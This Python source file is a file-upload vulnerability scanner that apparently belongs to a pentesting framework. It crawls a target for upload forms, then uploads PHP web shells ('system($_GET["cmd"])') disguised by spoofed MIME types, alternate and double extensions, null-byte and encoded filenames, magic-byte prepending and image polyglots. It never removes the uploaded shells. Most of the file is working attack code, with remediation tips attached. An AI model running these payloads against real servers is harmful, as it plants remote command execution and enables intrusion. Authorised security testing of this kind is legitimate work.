"""
Unrestricted File Upload Scanner (Professional Pentesting Edition)
==================================================================

Advanced file upload vulnerability scanner testing multiple bypass techniques
used by professional penetration testers.

Features:
- Content-Type spoofing
- Extension blacklist bypass (double extension, null byte, case variation)
- Magic byte manipulation
- MIME type confusion
- File size manipulation
- Filename encoding bypass

CWE: CWE-434 (Unrestricted Upload of File with Dangerous Type)
OWASP: A01:2021 - Broken Access Control
WSTG: WSTG-BUSL-08, WSTG-BUSL-09

Author: BreachScan Professional Pentesting Framework
Version: 2.0.0
"""

import logging
import httpx
import asyncio
import hashlib
import base64
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from urllib.parse import urljoin, urlparse
from pathlib import Path

logger = logging.getLogger(__name__)


class UnrestrictedUploadScanner:
    """
    Professional-grade unrestricted file upload vulnerability scanner
    
    Tests for:
    1. Content-Type validation bypass
    2. Extension blacklist bypass
    3. Magic byte validation bypass
    4. MIME type confusion
    5. Double extension attacks
    6. Null byte injection
    7. Case sensitivity bypass
    8. Unicode/encoding bypass
    """
    
    def __init__(self, target_url: str, timeout: int = None, **kwargs):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.findings = []
        self.test_mode = kwargs.get('test_mode', 'aggressive')  # passive, normal, aggressive
        self.cookies = kwargs.get('session_cookies') or kwargs.get('cookies', {})
        
        # Generate unique marker for this scan
        self.scan_id = hashlib.md5(f"{target_url}{datetime.now().isoformat()}".encode()).hexdigest()[:8]
        
        # Dangerous file extensions to test
        self.dangerous_extensions = [
            'php', 'php3', 'php4', 'php5', 'phtml', 'phps',  # PHP
            'asp', 'aspx', 'cer', 'asa',  # ASP
            'jsp', 'jspx',  # JSP
            'sh', 'bash', 'cgi',  # Shell scripts
            'pl', 'py', 'rb',  # Scripting languages
            'exe', 'dll', 'com',  # Windows executables
            'svg', 'swf',  # Client-side execution
        ]
        
        # Common upload endpoints
        self.upload_endpoints = [
            '/upload', '/upload.php', '/api/upload', '/api/v1/upload',
            '/file/upload', '/files/upload', '/media/upload',
            '/admin/upload', '/user/upload', '/profile/upload',
            '/image/upload', '/avatar/upload', '/document/upload',
            '/files', '/file-upload', '/import', '/assignments', 
            '/upload-file', '/share', '/documents'
        ]
        
    async def scan(self) -> Dict[str, Any]:
        """Execute comprehensive unrestricted upload scan"""
        
        logger.info(f"[{self.scan_id}] Starting Unrestricted Upload scan for {self.target_url}")
        logger.info(f"[{self.scan_id}] Test Mode: {self.test_mode}")
        
        start_time = datetime.now()
        
        # Discover upload endpoints
        upload_urls = await self._discover_upload_endpoints()
        
        if not upload_urls:
            logger.warning(f"[{self.scan_id}] No upload endpoints discovered")
            return self._generate_results(scan_duration=(datetime.now() - start_time).total_seconds())
        
        logger.info(f"[{self.scan_id}] Found {len(upload_urls)} upload endpoints")
        
        # Test each endpoint
        for url in upload_urls:
            logger.info(f"[{self.scan_id}] Testing endpoint: {url}")
            
            # 1. Content-Type bypass
            await self._test_content_type_bypass(url)
            
            # 2. Extension bypass techniques
            await self._test_extension_bypass(url)
            
            # 3. Magic byte bypass
            await self._test_magic_byte_bypass(url)
            
            # 4. Double extension
            await self._test_double_extension(url)
            
            # 5. Null byte injection
            await self._test_null_byte_injection(url)
            
            # 6. Case sensitivity
            await self._test_case_sensitivity(url)
            
            # 7. Unicode/encoding bypass
            await self._test_encoding_bypass(url)
            
            # 8. MIME type confusion
            await self._test_mime_confusion(url)
        
        scan_duration = (datetime.now() - start_time).total_seconds()
        return self._generate_results(scan_duration)
    
    async def _discover_upload_endpoints(self) -> List[str]:
        """Discover upload endpoints through crawling and common paths"""
        
        discovered = set()
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            
            # 1. Active Crawling of Base Page
            try:
                logger.info(f"[{self.scan_id}] Crawling base URL for upload forms: {self.target_url}")
                base_resp = await client.get(self.target_url)
                if base_resp.status_code == 200:
                    text = base_resp.text
                    import re
                    
                    # A. Check for immediate file inputs
                    if 'type="file"' in text.lower() or 'multipart/form-data' in text.lower():
                        logger.info(f"[{self.scan_id}] Found file input on base URL")
                        discovered.add(self.target_url)
                    
                    # B. Find Links containing 'upload', 'file', 'files'
                    # Regex for href="..."
                    links = re.findall(r'href=["\'](.*?)["\']', text, re.IGNORECASE)
                    for link in links:
                        # Normalize
                        if link.startswith('#') or link.startswith('javascript:'):
                            continue
                            
                        # Keywords to identify potential upload pages
                        if any(k in link.lower() for k in ['upload', 'file', 'import', 'attach', 'assignment', 'submit']):
                            full_url = urljoin(self.target_url, link)
                            # Verify valid URL
                            if urlparse(full_url).scheme in ['http', 'https']:
                                discovered.add(full_url)
                                logger.info(f"[{self.scan_id}] Discovered potential upload link: {full_url}")

                    # C. Find Form Actions
                    # <form ... action="...">
                    actions = re.findall(r'action=["\'](.*?)["\']', text, re.IGNORECASE)
                    for action in actions:
                         # Be aggressive: Test all form actions if we can't determine purpose?
                         # Or just add them if they look suspicious
                         if any(k in action.lower() for k in ['upload', 'file', 'submit', 'save']):
                             full_url = urljoin(self.target_url, action)
                             discovered.add(full_url)

            except Exception as e:
                logger.debug(f"[{self.scan_id}] Crawling failed: {e}")

            # 2. Test common upload endpoints
            for endpoint in self.upload_endpoints:
                url = urljoin(self.target_url, endpoint)
                if url in discovered:
                    continue
                    
                try:
                    response = await client.get(url)
                    
                    # Check if endpoint exists and accepts file uploads
                    if response.status_code < 400:
                        content = response.text.lower()
                        if any(keyword in content for keyword in ['upload', 'file', 'attach', 'browse', 'input type="file"', 'directory']):
                            discovered.add(url)
                            logger.info(f"[{self.scan_id}] Discovered upload endpoint via fuzzing: {url}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error testing {url}: {e}")
                    continue
        
        return list(discovered)
    
    async def _test_content_type_bypass(self, url: str):
        """Test Content-Type header validation bypass"""
        
        logger.debug(f"[{self.scan_id}] Testing Content-Type bypass at {url}")
        
        # PHP shell content
        php_shell = '<?php system($_GET["cmd"]); ?>'
        
        # Test various Content-Type spoofing
        content_types = [
            'image/jpeg',
            'image/png',
            'image/gif',
            'image/bmp',
            'application/octet-stream',
            'text/plain',
            'multipart/form-data'
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, cookies=self.cookies) as client:
            for content_type in content_types:
                try:
                    filename = f'shell_{self.scan_id}.php'
                    
                    # Upload with spoofed Content-Type
                    files = {'file': (filename, php_shell, content_type)}
                    response = await client.post(url, files=files)
                    
                    if self._is_upload_successful(response):
                        self._add_finding(
                            title='Content-Type Validation Bypass',
                            severity='critical',
                            description=f'File upload accepts dangerous PHP file with spoofed Content-Type: {content_type}',
                            location=url,
                            evidence={
                                'filename': filename,
                                'spoofed_content_type': content_type,
                                'response_status': response.status_code,
                                'response_snippet': response.text[:200]
                            },
                            cwe='CWE-434',
                            owasp='A01:2021 - Broken Access Control',
                            technique='Content-Type Spoofing'
                        )
                        logger.warning(f"[{self.scan_id}] Content-Type bypass successful: {content_type}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in Content-Type test: {e}")
                    continue
    
    async def _test_extension_bypass(self, url: str):
        """Test file extension blacklist bypass techniques"""
        
        logger.debug(f"[{self.scan_id}] Testing extension bypass at {url}")
        
        php_content = '<?php phpinfo(); ?>'
        
        # Extension bypass techniques
        bypass_extensions = [
            'pHP',  # Case variation
            'php5',  # Alternative PHP extensions
            'php3',
            'php4',
            'phtml',
            'phps',
            'pht',
            'php7',
            'shtml',
            'asa',
            'cer',
            'asp',
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, cookies=self.cookies) as client:
            for ext in bypass_extensions:
                try:
                    filename = f'test_{self.scan_id}.{ext}'
                    files = {'file': (filename, php_content, 'application/octet-stream')}
                    response = await client.post(url, files=files)
                    
                    if self._is_upload_successful(response):
                        self._add_finding(
                            title='File Extension Blacklist Bypass',
                            severity='critical',
                            description=f'Dangerous file extension accepted: .{ext}',
                            location=url,
                            evidence={
                                'filename': filename,
                                'extension': ext,
                                'response_status': response.status_code
                            },
                            cwe='CWE-434',
                            owasp='A01:2021 - Broken Access Control',
                            technique='Extension Blacklist Bypass'
                        )
                        logger.warning(f"[{self.scan_id}] Extension bypass successful: .{ext}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in extension bypass test: {e}")
                    continue
    
    async def _test_magic_byte_bypass(self, url: str):
        """Test magic byte (file signature) validation bypass"""
        
        logger.debug(f"[{self.scan_id}] Testing magic byte bypass at {url}")
        
        # PHP shell with valid image magic bytes prepended
        magic_bytes_tests = [
            # GIF89a + PHP
            (b'GIF89a<?php system($_GET["cmd"]); ?>', 'image/gif', 'gif'),
            # PNG header + PHP
            (b'\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>', 'image/png', 'png'),
            # JPEG header + PHP
            (b'\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>', 'image/jpeg', 'jpg'),
            # PDF header + PHP
            (b'%PDF-1.5\n<?php system($_GET["cmd"]); ?>', 'application/pdf', 'pdf'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, cookies=self.cookies) as client:
            for content, mime_type, ext in magic_bytes_tests:
                try:
                    filename = f'bypass_{self.scan_id}.{ext}.php'
                    files = {'file': (filename, content, mime_type)}
                    response = await client.post(url, files=files)
                    
                    if self._is_upload_successful(response):
                        self._add_finding(
                            title='Magic Byte Validation Bypass',
                            severity='critical',
                            description=f'File with valid {ext.upper()} magic bytes but PHP extension accepted',
                            location=url,
                            evidence={
                                'filename': filename,
                                'mime_type': mime_type,
                                'extension': ext,
                                'technique': 'Magic byte prepending'
                            },
                            cwe='CWE-434',
                            owasp='A01:2021 - Broken Access Control',
                            technique='Magic Byte Bypass'
                        )
                        logger.warning(f"[{self.scan_id}] Magic byte bypass successful: {ext}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in magic byte test: {e}")
                    continue
    
    async def _test_double_extension(self, url: str):
        """Test double extension attacks"""
        
        logger.debug(f"[{self.scan_id}] Testing double extension at {url}")
        
        php_content = '<?php system($_GET["cmd"]); ?>'
        
        # Double extension patterns
        double_extensions = [
            f'image_{self.scan_id}.php.jpg',
            f'image_{self.scan_id}.jpg.php',
            f'image_{self.scan_id}.php.png',
            f'image_{self.scan_id}.png.php',
            f'file_{self.scan_id}.php.txt',
            f'doc_{self.scan_id}.php.pdf',
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, cookies=self.cookies) as client:
            for filename in double_extensions:
                try:
                    files = {'file': (filename, php_content, 'image/jpeg')}
                    response = await client.post(url, files=files)
                    
                    if self._is_upload_successful(response):
                        self._add_finding(
                            title='Double Extension Attack Successful',
                            severity='critical',
                            description=f'File with double extension accepted: {filename}',
                            location=url,
                            evidence={
                                'filename': filename,
                                'response_status': response.status_code
                            },
                            cwe='CWE-434',
                            owasp='A01:2021 - Broken Access Control',
                            technique='Double Extension Attack'
                        )
                        logger.warning(f"[{self.scan_id}] Double extension successful: {filename}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in double extension test: {e}")
                    continue
    
    async def _test_null_byte_injection(self, url: str):
        """Test null byte injection in filenames"""
        
        logger.debug(f"[{self.scan_id}] Testing null byte injection at {url}")
        
        php_content = '<?php phpinfo(); ?>'
        
        # Null byte injection patterns
        null_byte_filenames = [
            f'shell_{self.scan_id}.php%00.jpg',
            f'shell_{self.scan_id}.php\x00.jpg',
            f'shell_{self.scan_id}.php%00.png',
            f'shell_{self.scan_id}.php%2500.jpg',  # URL encoded null byte
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, cookies=self.cookies) as client:
            for filename in null_byte_filenames:
                try:
                    files = {'file': (filename, php_content, 'image/jpeg')}
                    response = await client.post(url, files=files)
                    
                    if self._is_upload_successful(response):
                        self._add_finding(
                            title='Null Byte Injection in File Upload',
                            severity='critical',
                            description=f'Filename with null byte injection accepted: {filename}',
                            location=url,
                            evidence={
                                'filename': filename,
                                'technique': 'Null byte truncation',
                                'response_status': response.status_code
                            },
                            cwe='CWE-158',
                            owasp='A01:2021 - Broken Access Control',
                            technique='Null Byte Injection'
                        )
                        logger.warning(f"[{self.scan_id}] Null byte injection successful")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in null byte test: {e}")
                    continue
    
    async def _test_case_sensitivity(self, url: str):
        """Test case sensitivity in extension validation"""
        
        logger.debug(f"[{self.scan_id}] Testing case sensitivity at {url}")
        
        php_content = '<?php phpinfo(); ?>'
        
        # Case variation patterns
        case_variations = [
            f'shell_{self.scan_id}.PHP',
            f'shell_{self.scan_id}.PhP',
            f'shell_{self.scan_id}.pHP',
            f'shell_{self.scan_id}.Php',
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, cookies=self.cookies) as client:
            for filename in case_variations:
                try:
                    files = {'file': (filename, php_content, 'application/octet-stream')}
                    response = await client.post(url, files=files)
                    
                    if self._is_upload_successful(response):
                        self._add_finding(
                            title='Case Sensitivity Bypass in Extension Validation',
                            severity='high',
                            description=f'Case variation of dangerous extension accepted: {filename}',
                            location=url,
                            evidence={
                                'filename': filename,
                                'response_status': response.status_code
                            },
                            cwe='CWE-434',
                            owasp='A01:2021 - Broken Access Control',
                            technique='Case Sensitivity Bypass'
                        )
                        logger.warning(f"[{self.scan_id}] Case sensitivity bypass: {filename}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in case sensitivity test: {e}")
                    continue
    
    async def _test_encoding_bypass(self, url: str):
        """Test Unicode and encoding bypass techniques"""
        
        logger.debug(f"[{self.scan_id}] Testing encoding bypass at {url}")
        
        php_content = '<?php system($_GET["cmd"]); ?>'
        
        # Encoding bypass patterns
        encoding_filenames = [
            f'shell_{self.scan_id}.%70%68%70',  # URL encoded .php
            f'shell_{self.scan_id}.ph\u0070',  # Unicode
            f'shell_{self.scan_id}.p%68p',  # Partial encoding
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, cookies=self.cookies) as client:
            for filename in encoding_filenames:
                try:
                    files = {'file': (filename, php_content, 'application/octet-stream')}
                    response = await client.post(url, files=files)
                    
                    if self._is_upload_successful(response):
                        self._add_finding(
                            title='Encoding Bypass in Extension Validation',
                            severity='high',
                            description=f'Encoded filename accepted: {filename}',
                            location=url,
                            evidence={
                                'filename': filename,
                                'response_status': response.status_code
                            },
                            cwe='CWE-434',
                            owasp='A01:2021 - Broken Access Control',
                            technique='Encoding Bypass'
                        )
                        logger.warning(f"[{self.scan_id}] Encoding bypass successful")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in encoding test: {e}")
                    continue
    
    async def _test_mime_confusion(self, url: str):
        """Test MIME type confusion attacks"""
        
        logger.debug(f"[{self.scan_id}] Testing MIME confusion at {url}")
        
        # Polyglot files (valid as multiple file types)
        polyglot_tests = [
            # GIF + PHP polyglot
            (b'GIF89a;\n<?php system($_GET["cmd"]); ?>\n;', 'test.gif', 'image/gif'),
            # JPEG + PHP polyglot
            (b'\xff\xd8\xff\xe0\x00\x10JFIF<?php system($_GET["cmd"]); ?>', 'test.jpg', 'image/jpeg'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, cookies=self.cookies) as client:
            for content, filename, mime_type in polyglot_tests:
                try:
                    files = {'file': (f'{self.scan_id}_{filename}', content, mime_type)}
                    response = await client.post(url, files=files)
                    
                    if self._is_upload_successful(response):
                        self._add_finding(
                            title='MIME Type Confusion / Polyglot File Upload',
                            severity='high',
                            description=f'Polyglot file (valid as both image and PHP) accepted: {filename}',
                            location=url,
                            evidence={
                                'filename': filename,
                                'mime_type': mime_type,
                                'technique': 'Polyglot file creation'
                            },
                            cwe='CWE-434',
                            owasp='A01:2021 - Broken Access Control',
                            technique='MIME Confusion / Polyglot'
                        )
                        logger.warning(f"[{self.scan_id}] MIME confusion successful: {filename}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in MIME confusion test: {e}")
                    continue
    
    def _is_upload_successful(self, response: httpx.Response) -> bool:
        """Determine if upload was successful"""
        
        # Check status code
        if response.status_code >= 400:
            return False
        
        # Check response content for success indicators
        content_lower = response.text.lower()
        success_indicators = [
            'success', 'uploaded', 'saved', 'received', 
            'accepted', 'complete', 'file has been'
        ]
        
        error_indicators = [
            'error', 'failed', 'invalid', 'not allowed',
            'forbidden', 'rejected', 'denied'
        ]
        
        has_success = any(indicator in content_lower for indicator in success_indicators)
        has_error = any(indicator in content_lower for indicator in error_indicators)
        
        return has_success and not has_error
    
    def _add_finding(self, title: str, severity: str, description: str, 
                     location: str, evidence: Dict, cwe: str, owasp: str, technique: str):
        """Add a vulnerability finding"""
        
        finding = {
            'id': f"unrestricted_upload_{len(self.findings)}_{self.scan_id}",
            'title': title,
            'severity': severity,
            'description': description,
            'location': location,
            'evidence': evidence,
            'cwe': cwe,
            'owasp': owasp,
            'technique': technique,
            'timestamp': datetime.now().isoformat(),
            'recommendation': self._get_recommendation(technique)
        }
        
        self.findings.append(finding)
    
    def _get_recommendation(self, technique: str) -> str:
        """Get remediation recommendation for the technique"""
        
        recommendations = {
            'Content-Type Spoofing': 'Implement server-side file type validation based on content inspection, not just Content-Type headers.',
            'Extension Blacklist Bypass': 'Use whitelist-based extension validation. Normalize extensions to lowercase before checking.',
            'Magic Byte Bypass': 'Combine magic byte validation with extension checking. Scan entire file content for embedded code.',
            'Double Extension Attack': 'Use whitelist validation for ALL extensions. Configure web server to not execute files in upload directories.',
            'Null Byte Injection': 'Sanitize filenames by removing null bytes and special characters. Use secure file handling functions.',
            'Case Sensitivity Bypass': 'Normalize file extensions to lowercase before validation.',
            'Encoding Bypass': 'Decode and normalize filenames before validation. Use URL decoding and Unicode normalization.',
            'MIME Confusion / Polyglot': 'Implement strict file type validation. Re-encode uploaded files. Use Content Security Policy (CSP).'
        }
        
        return recommendations.get(technique, 'Implement comprehensive file upload validation and security controls.')
    
    def _generate_results(self, scan_duration: float) -> Dict[str, Any]:
        """Generate scan results"""
        
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for finding in self.findings:
            severity = finding.get('severity', 'info').lower()
            if severity in severity_counts:
                severity_counts[severity] += 1
        
        return {
            'scanner': 'Unrestricted Upload Scanner (Professional Edition)',
            'scan_id': self.scan_id,
            'target': self.target_url,
            'status': 'completed',
            'test_mode': self.test_mode,
            'findings': self.findings,
            'summary': {
                'total_findings': len(self.findings),
                'severity_distribution': severity_counts,
                'scan_duration_seconds': scan_duration
            },
            'timestamp': datetime.now().isoformat()
        }


def create_scanner(target_url: str, **kwargs):
    """Factory function to create scanner instance"""
    return UnrestrictedUploadScanner(target_url, **kwargs)

